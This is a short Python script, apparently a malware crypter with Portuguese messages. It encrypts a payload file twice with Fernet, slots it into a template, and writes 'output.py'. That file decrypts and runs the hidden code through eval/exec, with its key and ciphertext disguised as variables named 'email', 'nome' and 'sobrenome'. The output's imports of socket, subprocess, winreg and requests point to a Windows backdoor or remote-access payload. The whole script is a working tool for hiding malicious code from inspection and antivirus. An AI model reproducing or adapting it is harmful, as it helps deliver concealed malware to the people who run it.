from cryptography.fernet import Fernet
import os

print("[+] Gerando key")
key = Fernet.generate_key()

print("[+] Salvando key")
keytxt = open('hack.key', 'wb')
keytxt.write(key)
keytxt.close()
print(f"[+] key salva em {os.getcwd()}\\hack.key")

cipher_suite = Fernet(key)

print("[+] Lendo payload.txt")
txt = open('payload.txt', 'rb')
print("[+] Codificando payload")
encrypted_payload = cipher_suite.encrypt(txt.read())
txt.close()

print("[+] Lendo encrypted_model.txt")
txt2 = open('encrypted_model.txt', 'rb')
model_encrypted = txt2.read().replace(b'YOURENCRYPTEDPAYLOADHERE', encrypted_payload)
txt2.close()

print("[+] Codificando modelo modificado")
key2 = Fernet.generate_key()
cipher_suite2 = Fernet(key2)
encrypted_final = cipher_suite2.encrypt(model_encrypted)
print("[+] Criando arquivo final codificado")
txt3 = open('output.py', 'wb')
txt3.write(f"from cryptography.fernet import Fernet; "
           f"import socket; "
           f"import os; "
           f"import platform; "
           f"import subprocess; "
           f"from time import sleep; "
           f"import requests; "
           f"from threading import Thread; "
           f"from sys import argv; "
           f"import winreg; "
           f"email={key2}; "
           f"nome={encrypted_final}; "
           f"sobrenome=Fernet(email).decrypt(nome); "
           f"eval('exec('+str(sobrenome)+')')".encode())
txt3.close()
print(f"[+] Arquivo final salvo em {os.getcwd()}\\output.py")
